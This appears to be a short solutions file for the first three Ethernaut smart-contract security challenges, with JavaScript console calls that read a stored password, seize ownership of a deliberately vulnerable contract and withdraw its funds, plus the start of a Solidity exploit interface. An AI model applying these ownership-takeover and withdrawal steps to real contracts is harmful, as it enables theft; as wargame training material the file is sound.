# Levels

## Level 00

https://ethernaut.openzeppelin.com/level/0

```Javascript
await contract.password()
await contract.authenticate("ethernaut0")
```

https://mumbai.polygonscan.com/tx/0xb479fa5cda3731d1ceb34cd1b7788f30022e31d63eaf4ebc63351c22aa3f3806

## Level 01

https://ethernaut.openzeppelin.com/level/1

```javascript
await contract.owner() 
await contract.contributions("0x2a24869323C0B13Dff24E196Ba072dC790D52479")
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})

await sendTransaction({from: player, to: contract.address, value: toWei('0.0000000001')})
await contract.withdraw()
```

## Level 02

https://ethernaut.openzeppelin.com/level/2

```javascript
pragma solidity ^0.6.0;

interface Fallout {
    function Fal1out() external payable;
}
```
